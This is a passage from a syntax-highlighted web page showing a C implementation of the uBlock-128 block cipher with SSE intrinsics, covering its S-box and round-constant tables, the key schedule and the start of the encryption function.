class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;memory.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;emmintrin.h&gt;</span><span class=\"comment\">//sse2 header file(include sse header file)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pmmintrin.h&gt;</span> <span class=\"comment\">//SSE3(include emmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;tmmintrin.h&gt;</span><span class=\"comment\">//SSSE3(include pmmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;smmintrin.h&gt;</span><span class=\"comment\">//SSE4.1(include tmmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;nmmintrin.h&gt;</span><span class=\"comment\">//SSE4.2(include smmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;intrin.h&gt;</span><span class=\"comment\">//(include immintrin.h)  </span></span></span><br><span class=\"line\"></span><br><span class=\"line\">__m128i S     = _mm_setr_epi8(<span class=\"number\">0x7</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x5</span>);</span><br><span class=\"line\">__m128i S_Inv = _mm_setr_epi8(<span class=\"number\">0xc</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">__m128i con = _mm_set1_epi8(<span class=\"number\">0x0f</span>);</span><br><span class=\"line\">__m128i A1 = _mm_setr_epi8(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>);\t</span><br><span class=\"line\">__m128i A2 = _mm_setr_epi8(<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>);\t\t</span><br><span class=\"line\">__m128i A3 = _mm_setr_epi8(<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> Subkey[<span class=\"number\">17</span>][<span class=\"number\">32</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> RC[<span class=\"number\">16</span>][<span class=\"number\">16</span>] = &#123;<span class=\"number\">0x9</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xf</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x2</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x8</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xc</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x4</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x5</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x7</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xb</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xa</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x8</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xd</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x7</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x3</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xa</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_KeySchedule</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key)</span><span class=\"comment\">// 密钥生成函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i SK = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>, <span class=\"number\">9</span>, <span class=\"number\">15</span>, <span class=\"number\">13</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>);\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">6</span>,<span class=\"number\">0</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">1</span>,<span class=\"number\">15</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">12</span>,<span class=\"number\">2</span>,<span class=\"number\">11</span>,<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">14</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)key);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)Subkey[<span class=\"number\">0</span>], state1);</span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)(Subkey[<span class=\"number\">0</span>] + <span class=\"number\">16</span>), state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">1</span>; i &lt;= <span class=\"number\">16</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)RC[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\tk = _mm_xor_si128(k, state1);</span><br><span class=\"line\">\t\tt1 =  _mm_shuffle_epi8(S, k);</span><br><span class=\"line\">\t\tt2 = _mm_shuffle_epi8(SK, k);</span><br><span class=\"line\">\t\tt3 = _mm_shuffle_epi8(t1, c5);</span><br><span class=\"line\">\t\tt4 = _mm_shuffle_epi8(t2, c6);</span><br><span class=\"line\">\t\tk = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tk = _mm_xor_si128(k, state2);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\t\tstate1 = k;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t_mm_storeu_si128((__m128i*)Subkey[i], state1);</span><br><span class=\"line\">\t\t_mm_storeu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>), state2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_Encrypt</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *plain, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cipher, <span class=\"type\">int</span> round)</span><span class=\"comment\">//uBlock加密函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i L1 = _mm_setr_epi8(<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>);\t\t</span><br><span class=\"line\">\t__m128i L2 = _mm_setr_epi8(<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span 